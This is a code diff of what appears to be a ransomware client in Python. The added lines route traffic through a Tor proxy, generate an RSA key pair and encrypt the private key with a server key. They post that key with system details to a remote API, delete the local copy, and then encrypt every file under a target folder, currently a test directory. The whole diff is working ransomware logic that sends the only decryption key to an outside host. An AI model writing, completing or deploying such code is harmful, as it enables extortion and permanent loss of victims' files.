@@ -3,14 +3,23 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.backends import default_backend
 from RSA.RSAKeyGen import RSAKeyGen
 import base64
+import platform
+import uuid
+import Config
+import json
+from pathlib import Path
 from Helper import Helper
 from FileCrypter import FileCrypter
 from TorManager import TorManager
 
-global _helper
 _helper = Helper()
+_session = 0
 
 def init():
+    global _session
+    tor = TorManager()
+    tor.startProxy()
+    _session = tor.getSession()
     genKeyPair()
 
 
@@ -18,24 +27,34 @@ def genKeyPair():
     keys = RSAKeyGen()
     _helper.info("Keys generated!")
     cipher_cpriv_key = base64.b64encode(encryptClientPrivKey(keys.getPrivateKeyAsStr()))
+    #send key and sys info to API
+    os_info = platform.platform()
+    data = {
+        'hwid': str(uuid.uuid4()),
+        'priv_key': cipher_cpriv_key.decode('utf-8'),
+        'platform': os_info
+    }
+    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
+    req = _session.post(Config.API_URL + "/users/add", data=json.dumps(data), headers=headers)
+    _helper.debug("Got Response from /users/add => " + str(req.json()))
+    keys.forgetPrivate()
 
-    #writeFile('client.private.enc.key', cipher_cpriv_key.decode('utf-8'))
-
-
-    #with open("serverkeys/private.key", "rb") as server_p:
-      #  server_priv_key = serialization.load_pem_private_key(
-      #      server_p.read(),
-     #       password=None,
-     #       backend=default_backend()
-     #   )
-    #clear_key = decryptCPriv(server_priv_key, "client.private.enc.key")
+    pathlist = Path('./test_files').glob('**/*')
+    for path in pathlist:
+        path_in_str = str(path)
+        fc = FileCrypter()
+        try:
+            fc.encrypt_file(path_in_str, keys.getPublicKeyAsStr())
+            _helper.info("Encrypted " + path_in_str)
+        except IOError:
+            _helper.error("Could not encrypt " + path_in_str)
 
     #fC = FileCrypter()
     #fC.encrypt_file("info4.pdf", keys.getPublicKeyAsStr())
     #time.sleep(40)
     #fC.decrypt_file("info4.pdf.supergirl", clear_key.decode('utf-8'))
 
-    keys.forgetPrivate()
+
 
 def encryptClientPrivKey(priv_key):
     """Encrypt the Clients private key (given as a str) with the servers public key"""
@@ -57,28 +76,6 @@ def encryptClientPrivKey(priv_key):
     _helper.info("Private Client Key is encrypted")
     return cipher
 
-
-def decryptCPriv(server_priv, client_private_enc_key_filename):
-    """Decrypts the clients private key with the servers private key"""
-    with open(client_private_enc_key_filename, 'rb') as x:
-        to_encrypt = x.read()
-        x.close()
-    to_encrypt = to_encrypt.decode('utf-8')
-    to_encrypt = base64.b64decode(to_encrypt)
-    to_encrypt = bytes(to_encrypt)
-
-    clear_key = server_priv.decrypt(
-        to_encrypt,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA1(),
-            label=None
-        )
-    )
-    return clear_key
-
 if __name__ == "__main__":
     _helper.info("Program started")
-    t = TorManager()
-    #t.startProxy()
-    #init()
+    init()
